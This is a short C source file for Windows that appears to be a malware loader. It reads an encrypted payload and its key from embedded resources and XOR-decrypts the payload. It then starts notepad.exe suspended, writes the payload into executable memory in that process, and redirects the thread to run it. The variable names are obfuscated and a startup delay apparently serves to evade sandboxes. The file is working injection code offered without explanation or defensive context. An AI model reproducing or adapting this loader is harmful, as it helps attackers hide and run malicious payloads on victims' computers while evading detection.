#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void loadresbabe(const char* resName, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
    
    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}

void XXXoordec(char* c1o2d3e4, DWORD c1o2d3e4Len, unsigned char* k1e2y6, DWORD k1e2y6Len) {
    for (DWORD da = 0; da < c1o2d3e4Len; da++) {
        c1o2d3e4[da] ^= k1e2y6[da % k1e2y6Len];
    }
}

int main() {
    Sleep(2000);

    
    char* k1e2y6ENC;
    DWORD k1e2y6ENCLen;
    loadresbabe("k1e2y6ENC", &k1e2y6ENC, &k1e2y6ENCLen);

    char* c1o2d3e4Enc;
    DWORD c1o2d3e4EncLen;
    loadresbabe("c1o2d3e4Enc", &c1o2d3e4Enc, &c1o2d3e4EncLen);
    XXXoordec(c1o2d3e4Enc, c1o2d3e4EncLen, (unsigned char*)k1e2y6ENC, k1e2y6ENCLen);
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
      
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, c1o2d3e4EncLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, memlo, c1o2d3e4Enc, c1o2d3e4EncLen, NULL);
    ctx.Rcx = (DWORD64)memlo; 
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread); 

    return 0;
}
